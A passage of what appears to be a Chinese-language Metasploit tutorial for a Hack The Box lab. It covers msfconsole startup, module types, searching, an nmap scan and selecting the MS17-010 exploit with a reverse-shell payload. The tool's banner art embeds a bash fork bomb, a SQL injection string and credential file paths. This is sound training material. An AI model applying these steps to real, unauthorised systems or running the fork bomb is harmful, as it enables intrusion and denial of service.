class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls /usr/share/metasploit-framework/tools/</span><br><span class="line"></span><br><span class="line">context  docs     hardware  modules   payloads</span><br><span class="line">dev      exploit  memdump   password  recon</span><br></pre></td></tr></table></figure><p>现在我们知道了所有这些位置，当我们决定导入新模块甚至从头开始创建新模块时，我们将来可以很容易地引用它们。</p><h2 id="MSF控制台简介"><a href="#MSF控制台简介" class="headerlink" title="MSF控制台简介"></a>MSF控制台简介</h2><p>要开始与 Metasploit Framework 交互，我们需要输入<code>msfconsole</code>我们选择的终端。许多面向安全的发行版（例如 Parrot Security 和 Kali Linux）都预装了<code>msfconsole</code>。与任何其他命令行工具一样，我们可以在启动脚本时使用其他几个选项。这些从图形显示开关&#x2F;选项到程序开关&#x2F;选项不等。</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>启动后<code>msfconsole</code>，我们会看到他们创造的启动画面和命令行提示符，等待我们的第一个命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">nswer77@htb[/htb]$ msfconsole</span><br><span class="line">                                                  </span><br><span class="line">                                              `:oDFo:`                            </span><br><span class="line">                                           ./ymM0dayMmy/.                          </span><br><span class="line">                                        -+dHJ5aGFyZGVyIQ==+-                    </span><br><span class="line">                                    `:sm⏣~~Destroy.No.Data~~s:`                </span><br><span class="line">                                 -+h2~~Maintain.No.Persistence~~h+-              </span><br><span class="line">                             `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`          </span><br><span class="line">                          ./etc/shadow.0days-Data&#x27;%20OR%201=1--.No.0MN8&#x27;/.      </span><br><span class="line">                       -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-    </span><br><span class="line">                      -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-  </span><br><span class="line">                      :dopeAW.No&lt;nano&gt;o                     :is:TЯiKC.sudo-.A:  </span><br><span class="line">                      :we&#x27;re.all.alike&#x27;`                     The.PFYroy.No.D7:  </span><br><span class="line">                      :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:    </span><br><span class="line">                      :msf&gt;exploit -j.                       :Ns.BOB&amp;ALICEes7:    </span><br><span class="line">                      :---srwxrwx:-.`                        `MS146.52.No.Per:    </span><br><span class="line">                      :&lt;script&gt;.Ac816/                        sENbove3101.404:    </span><br><span class="line">                      :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:    </span><br><span class="line">                      :09.14.2011.raid                       /STFU|wall.No.Pr:    </span><br><span class="line">                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:    </span><br><span class="line">                      :#OUTHOUSE-  -s:                       /corykennedyData:    </span><br><span class="line">                      :$nmap -oS                              SSo.6178306Ence:    </span><br><span class="line">                      :Awsm.da:                            /shMTl#beats3o.No.:    </span><br><span class="line">                      :Ring0:                             `dDestRoyREXKC3ta/M:    </span><br><span class="line">                      :23d:                               sSETEC.ASTRONOMYist:    </span><br><span class="line">                       /-                        /yo-    .ence.N:()&#123; :|: &amp; &#125;;:    </span><br><span class="line">                                                 `:Shall.We.Play.A.Game?tron/    </span><br><span class="line">                                                 ```-ooy.if1ghtf0r+ehUser5`    </span><br><span class="line">                                               ..th3.H1V3.U2VjRFNN.jMh+.`          </span><br><span class="line">                                              `MjM~~WE.ARE.se~~MMjMs              </span><br><span class="line">                                               +~KANSAS.CITY&#x27;s~-`                  </span><br><span class="line">                                                J~HAKCERS~./.`                    </span><br><span class="line">                                                .esc:wq!:`                        </span><br><span class="line">                                                 +++ATH`                            </span><br><span class="line">                                                  `</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v6.1.9-dev                           ]</span><br><span class="line">+ -- --=[ 2169 exploits - 1149 auxiliary - 398 post       ]</span><br><span class="line">+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 9 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit tip: Use sessions -1 to interact with the last opened session</span><br><span class="line"></span><br><span class="line">msf6 &gt; </span><br></pre></td></tr></table></figure><p>或者，我们可以使用<code>-q</code>不显示横幅的选项。</p><p> 启动 MSF 控制台</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfconsole -q</span><br><span class="line"></span><br><span class="line">msf6 &gt; </span><br></pre></td></tr></table></figure><p>为了更好地查看所有可用命令，我们可以键入命令<code>help</code>。首先，我们的工具需要锋利。我们需要做的第一件事就是确保构成框架的模块是最新的，并且可以导入任何可供公众使用的新模块。</p><p>旧方法是<code>msfupdate</code>在我们的 OS 终端（外部<code>msfconsole</code>）中运行。但是，<code>apt</code>包管理器目前可以毫不费力地处理模块和功能的更新。</p><h4 id="安装-MSF"><a href="#安装-MSF" class="headerlink" title="安装 MSF"></a>安装 MSF</h4><p> 安装 MSF</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo apt update &amp;&amp; sudo apt install metasploit-framework</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">(Reading database ... 414458 files and directories currently installed.)</span><br><span class="line">Preparing to unpack .../metasploit-framework_6.0.2-0parrot1_amd64.deb ...</span><br><span class="line">Unpacking metasploit-framework (6.0.2-0parrot1) over (5.0.88-0kali1) ...</span><br><span class="line">Setting up metasploit-framework (6.0.2-0parrot1) ...</span><br><span class="line">Processing triggers for man-db (2.9.1-1) ...</span><br><span class="line">Scanning application launchers</span><br><span class="line">Removing duplicate launchers from Debian</span><br><span class="line">Launchers are updated</span><br></pre></td></tr></table></figure><p>我们将在本模块中介绍的首要步骤之一是<code>exploit</code>为我们的<code>target</code>. 然而，在尝试任何利用之前，我们需要对自身有一个详细的了解<code>target</code>。这涉及<code>Enumeration</code>在任何类型的利用尝试之前的过程。</p><p>在 期间<code>Enumeration</code>，我们必须查看我们的目标并确定其上运行的是哪些面向公众的服务。例如，它是一个 HTTP 服务器吗？它是一个FTP服务器吗？它是 SQL 数据库吗？这些不同的<code>target</code>类型在现实世界中差别很大。我们需要从全面了解<code>scan</code>目标的 IP 地址开始，以确定正在运行的服务以及为每个服务安装的版本。</p><p>我们会注意到，在我们进行过程中，版本是该过程中的关键组件<code>Enumeration</code>，它将使我们能够确定目标是否易受攻击。以前易受攻击的服务的未修补版本或可公开访问的平台中的过时代码通常是我们进入系统的入口点<code>target</code>。</p><hr><h2 id="MSF-参与结构"><a href="#MSF-参与结构" class="headerlink" title="MSF 参与结构"></a>MSF 参与结构</h2><p>MSF 参与结构可分为五个主要类别。</p><ul><li>枚举</li><li>准备</li><li>开发</li><li>特权升级</li><li>开发后</li></ul><p>这种划分使我们更容易以更结构化的方式查找和选择适当的 MSF 功能，并相应地使用它们。这些类别中的每一个都有用于特定目的的不同子类别。这些包括，例如，服务验证和漏洞研究。</p><p>因此，我们熟悉这种结构至关重要。因此，我们将查看此框架的组件以更好地理解它们之间的关系。</p><p><img src="/img/METASPLOIT2.png"></p><p>我们将在本模块中逐一介绍这些类别，但我们建议您自己查看各个组件并深入挖掘。尝试不同的功能是学习新工具或技能不可或缺的一部分。因此，我们应该在接下来的实验室中尝试所有可以想象到的东西，并独立分析结果。</p><h2 id="模块-1"><a href="#模块-1" class="headerlink" title="模块"></a>模块</h2><p>正如我们之前提到的，Metasploit<code>modules</code>是具有特定目的和相应功能的准备脚本，这些脚本已经在野外开发和测试过。该<code>exploit</code>类别由所谓的概念验证 ( <code>POCs</code>) 组成，可用于以很大程度上自动化的方式利用现有漏洞。很多人常常认为，漏洞利用的失败证明了疑似漏洞的存在。然而，这只是证明 Metasploit 漏洞不起作用，并不能证明该漏洞不存在。这是因为许多漏洞需要根据目标主机进行定制才能使漏洞发挥作用。因此，诸如 Metasploit 框架之类的自动化工具只能被视为一种支持工具，不能替代我们的手动技能。</p><p>一旦进入<code>msfconsole</code>，我们就可以从包含所有可用 Metasploit 模块的广泛列表中进行选择。它们中的每一个都被组织成文件夹，如下所示：</p><h4 id="句法"><a href="#句法" class="headerlink" title="句法"></a>句法</h4><p> 句法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;No.&gt; &lt;type&gt;/&lt;os&gt;/&lt;service&gt;/&lt;name&gt;</span><br></pre></td></tr></table></figure><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p> 例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">794   exploit/windows/ftp/scriptftp_list</span><br></pre></td></tr></table></figure><h4 id="索引号"><a href="#索引号" class="headerlink" title="索引号"></a>索引号</h4><p>将显示标签<code>No.</code>以选择我们之后在搜索过程中想要的漏洞利用。稍后我们将看到<code>No.</code>标签对选择特定的 Metasploit 模块有多大帮助。</p><h4 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h4><p>标签<code>Type</code>是 Metasploit 之间的第一级隔离<code>modules</code>。查看此字段，我们可以知道此模块的代码段将完成什么。例如，其中一些<code>types</code>不能像模块那样直接使用。<code>exploit</code>但是，他们将在可交互的结构旁边引入结构，以实现更好的模块化。为了更好地解释，以下是该字段中可能出现的类型：</p><table><thead><tr><th><strong>类型</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>Auxiliary</code></td><td>扫描、模糊测试、嗅探和管理功能。提供额外的帮助和功能。</td></tr><tr><td><code>Encoders</code></td><td>确保有效负载完好无损地到达目的地。</td></tr><tr><td><code>Exploits</code></td><td>定义为利用允许有效载荷传递的漏洞的模块。</td></tr><tr><td><code>NOPs</code></td><td>（无操作代码）在攻击尝试中保持负载大小一致。</td></tr><tr><td><code>Payloads</code></td><td>代码远程运行并回调攻击者机器以建立连接（或 shell）。</td></tr><tr><td><code>Plugins</code></td><td>附加脚本可以集成在一个评估中并<code>msfconsole</code>与之共存。</td></tr><tr><td><code>Post</code></td><td>用于收集信息、深入研究等的广泛模块。</td></tr></tbody></table><p>请注意，在选择用于有效载荷传输的模块时，该命令只能与以下可用作（或可交互模块）<code>use &lt;no.&gt;</code>的模块一起使用：<code>initiators</code></p><table><thead><tr><th><strong>类型</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>Auxiliary</code></td><td>扫描、模糊测试、嗅探和管理功能。提供额外的帮助和功能。</td></tr><tr><td><code>Exploits</code></td><td>定义为利用允许有效载荷传递的漏洞的模块。</td></tr><tr><td><code>Post</code></td><td>用于收集信息、深入研究等的广泛模块。</td></tr></tbody></table><h4 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h4><p>该<code>OS</code>标记指定为哪个操作系统和体系结构创建模块。自然地，不同的操作系统需要运行不同的代码以获得期望的结果。</p><h4 id="servive"><a href="#servive" class="headerlink" title="servive"></a>servive</h4><p>该<code>Service</code>标签指的是目标机器上运行的易受攻击的服务。对于某些模块，例如 the<code>auxiliary</code>或<code>post</code>ones，此标记可以指更一般的活动<code>gather</code>，例如，指的是收集凭据。</p><h4 id="name"><a href="#name" class="headerlink" title="name"></a>name</h4><p>最后，<code>Name</code>标签解释了使用为特定目的创建的模块可以执行的实际操作。</p><h2 id="搜索模块"><a href="#搜索模块" class="headerlink" title="搜索模块"></a>搜索模块</h2><p>Metasploit 还为现有模块提供完善的搜索功能。借助此功能，我们可以使用 specific 快速搜索所有模块，<code>tags</code>以找到适合我们目标的模块。</p><h4 id="MSF-搜索功能"><a href="#MSF-搜索功能" class="headerlink" title="MSF - 搜索功能"></a>MSF - 搜索功能</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; help search</span><br><span class="line"></span><br><span class="line">Usage: search [&lt;options&gt;] [&lt;keywords&gt;:&lt;value&gt;]</span><br><span class="line"></span><br><span class="line">Prepending a value with &#x27;-&#x27; will exclude any matching results.</span><br><span class="line">If no options or keywords are provided, cached results are displayed.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line">  -h                   Show this help information</span><br><span class="line">  -o &lt;file&gt;            Send output to a file in csv format</span><br><span class="line">  -S &lt;string&gt;          Regex pattern used to filter search results</span><br><span class="line">  -u                   Use module if there is one result</span><br><span class="line">  -s &lt;search_column&gt;   Sort the research results based on &lt;search_column&gt; in ascending order</span><br><span class="line">  -r                   Reverse the search results order to descending order</span><br><span class="line"></span><br><span class="line">Keywords:</span><br><span class="line">  aka              :  Modules with a matching AKA (also-known-as) name</span><br><span class="line">  author           :  Modules written by this author</span><br><span class="line">  arch             :  Modules affecting this architecture</span><br><span class="line">  bid              :  Modules with a matching Bugtraq ID</span><br><span class="line">  cve              :  Modules with a matching CVE ID</span><br><span class="line">  edb              :  Modules with a matching Exploit-DB ID</span><br><span class="line">  check            :  Modules that support the &#x27;check&#x27; method</span><br><span class="line">  date             :  Modules with a matching disclosure date</span><br><span class="line">  description      :  Modules with a matching description</span><br><span class="line">  fullname         :  Modules with a matching full name</span><br><span class="line">  mod_time         :  Modules with a matching modification date</span><br><span class="line">  name             :  Modules with a matching descriptive name</span><br><span class="line">  path             :  Modules with a matching path</span><br><span class="line">  platform         :  Modules affecting this platform</span><br><span class="line">  port             :  Modules with a matching port</span><br><span class="line">  rank             :  Modules with a matching rank (Can be descriptive (ex: &#x27;good&#x27;) or numeric with comparison operators (ex: &#x27;gte400&#x27;))</span><br><span class="line">  ref              :  Modules with a matching ref</span><br><span class="line">  reference        :  Modules with a matching reference</span><br><span class="line">  target           :  Modules affecting this target</span><br><span class="line">  type             :  Modules of a specific type (exploit, payload, auxiliary, encoder, evasion, post, or nop)</span><br><span class="line"></span><br><span class="line">Supported search columns:</span><br><span class="line">  rank             :  Sort modules by their exploitabilty rank</span><br><span class="line">  date             :  Sort modules by their disclosure date. Alias for disclosure_date</span><br><span class="line">  disclosure_date  :  Sort modules by their disclosure date</span><br><span class="line">  name             :  Sort modules by their name</span><br><span class="line">  type             :  Sort modules by their type</span><br><span class="line">  check            :  Sort modules by whether or not they have a check method</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">  search cve:2009 type:exploit</span><br><span class="line">  search cve:2009 type:exploit platform:-linux</span><br><span class="line">  search cve:2009 -s name</span><br><span class="line">  search type:exploit -s type -r</span><br></pre></td></tr></table></figure><p>例如，我们可以尝试查找<code>EternalRomance</code>旧版 Windows 操作系统的漏洞。这可能看起来像这样：</p><h4 id="MSF-寻找永恒的浪漫"><a href="#MSF-寻找永恒的浪漫" class="headerlink" title="MSF - 寻找永恒的浪漫"></a>MSF - 寻找永恒的浪漫</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search eternalromance</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                  Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----                                  ---------------  ----    -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">   1  auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; search eternalromance type:exploit</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                  Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----                                  ---------------  ----    -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br></pre></td></tr></table></figure><p>我们还可以使我们的搜索更粗略一些，并将其减少到一类服务。例如，对于 CVE，我们可以指定年份 ( <code>cve:&lt;year&gt;</code>)、平台 Windows ( <code>platform:&lt;os&gt;</code>)、我们要查找的模块类型 ( <code>type:&lt;auxiliary/exploit/post&gt;</code>)、可靠性等级 ( <code>rank:&lt;rank&gt;</code>) 和搜索名称 ( <code>&lt;pattern&gt;</code>)。这会将我们的结果缩减为仅符合上述所有条件的结果。</p><h4 id="MSF-特定搜索"><a href="#MSF-特定搜索" class="headerlink" title="MSF - 特定搜索"></a>MSF - 特定搜索</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search type:exploit platform:windows cve:2021 rank:excellent microsoft</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                            Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                            ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/windows/http/exchange_proxylogon_rce    2021-03-02       excellent  Yes    Microsoft Exchange ProxyLogon RCE</span><br><span class="line">   1  exploit/windows/http/exchange_proxyshell_rce    2021-04-06       excellent  Yes    Microsoft Exchange ProxyShell RCE</span><br><span class="line">   2  exploit/windows/http/sharepoint_unsafe_control  2021-05-11       excellent  Yes    Microsoft SharePoint Unsafe Control and ViewState RCE</span><br></pre></td></tr></table></figure><h2 id="模块选择"><a href="#模块选择" class="headerlink" title="模块选择"></a>模块选择</h2><p>要选择我们的第一个模块，我们首先需要找到一个。假设我们有一个目标正在运行易受 EternalRomance (MS17_010) 攻击的 SMB 版本。我们发现扫描目标时SMB服务器端口445是开放的。</p><p> MSF - 特定搜索</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ nmap -sV 10.10.10.40</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-13 21:38 UTC</span><br><span class="line">Stats: 0:00:50 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan</span><br><span class="line">Nmap scan report for 10.10.10.40</span><br><span class="line">Host is up (0.051s latency).</span><br><span class="line">Not shown: 991 closed ports</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">49152/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49156/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49157/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 60.87 seconds</span><br></pre></td></tr></table></figure><p>我们将启动<code>msfconsole</code>并搜索这个确切的漏洞名称。</p><h4 id="MSF-搜索-MS17-010"><a href="#MSF-搜索-MS17-010" class="headerlink" title="MSF - 搜索 MS17_010"></a>MSF - 搜索 MS17_010</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search ms17_010</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                      Disclosure Date  Rank     Check  Description</span><br><span class="line">   -  ----                                      ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span><br><span class="line">   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line">   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection</span><br></pre></td></tr></table></figure><p>接下来，我们要为这个场景选择合适的模块。从<code>Nmap</code>扫描中，我们检测到 SMB 服务在版本 上运行<code>Microsoft Windows 7 - 10</code>。通过一些额外的操作系统扫描，我们可以猜测这是一个运行易受攻击的 SMB 实例的 Windows 7。然后我们继续选择模块以<code>index no. 2</code>测试目标是否易受攻击。</p><h2 id="使用模块"><a href="#使用模块" class="headerlink" title="使用模块"></a>使用模块</h2><p>在交互式模块中，我们可以指定几个选项。这些用于使 Metasploit 模块适应给定的环境。因为在大多数情况下，我们总是需要扫描或攻击不同的IP地址。因此，我们需要这种功能来设置我们的目标并对其进行微调。要检查在将漏洞发送到目标主机之前需要设置哪些选项，我们可以使用命令<code>show options</code>。在利用发生之前需要设置的所有内容都将<code>Yes</code>在该<code>Required</code>列下显示。</p><h4 id="MSF-选择模块"><a href="#MSF-选择模块" class="headerlink" title="MSF - 选择模块"></a>MSF - 选择模块</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                  Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----                                  ---------------  ----    -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">   1  auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">msf6 &gt; use 0</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_psexec): </span><br><span class="line"></span><br><span class="line">   Name                  Current Setting                          Required  Description</span><br><span class="line">   ----                  ---------------                          --------  -----------</span><br><span class="line">   DBGTRACE              false                                    yes       Show extra debug trace info</span><br><span class="line">   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction</span><br><span class="line">   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)</span><br><span class="line">   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check</span><br><span class="line">                         rdlists/named_pipes.txt</span><br><span class="line">   RHOSTS                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework</span><br><span class="line">                                                                            /wiki/Using-Metasploit</span><br><span class="line">   RPORT                 445                                      yes       The Target port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing</span><br><span class="line">   SERVICE_DISPLAY_NAME                                           no        The service display name</span><br><span class="line">   SERVICE_NAME                                                   no        The service name</span><br><span class="line">   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no</span><br><span class="line">                                                                            rmal read/write folder share</span><br><span class="line">   SMBDomain             .                                        no        The Windows domain to use for authentication</span><br><span class="line">   SMBPass                                                        no        The password for the specified username</span><br><span class="line">   SMBUser                                                        no        The username to authenticate as</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br></pre></td></tr></table></figure><p>在这里，我们<code>No.</code>可以看到标签有多大帮助。因为现在，我们不必在搜索中键入整个路径，而只需键入分配给 Metasploit 模块的编号。<code>info</code>如果我们想了解更多关于模块的信息，可以在选择模块后使用命令。这将为我们提供一系列对我们很重要的信息。</p><h4 id="MSF-模块信息"><a href="#MSF-模块信息" class="headerlink" title="MSF - 模块信息"></a>MSF - 模块信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 